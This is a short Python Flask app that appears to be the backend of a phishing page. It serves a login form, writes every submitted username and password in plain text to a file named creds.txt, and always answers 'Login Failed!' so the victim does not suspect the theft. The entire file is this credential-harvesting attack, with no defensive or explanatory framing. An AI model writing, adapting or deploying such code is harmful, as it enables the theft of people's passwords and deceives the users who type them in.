from flask import Flask, request, render_template

app = Flask(__name__)

@app.route('/')
def home():
    return render_template("login.html")

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get("username")
    password = request.form.get("password")

    with open("creds.txt", "a") as f:
        f.write(f"Username: {username} | Password: {password}\n")

    return "Login Failed!"

if __name__ == "__main__":
    app.run(debug=True)
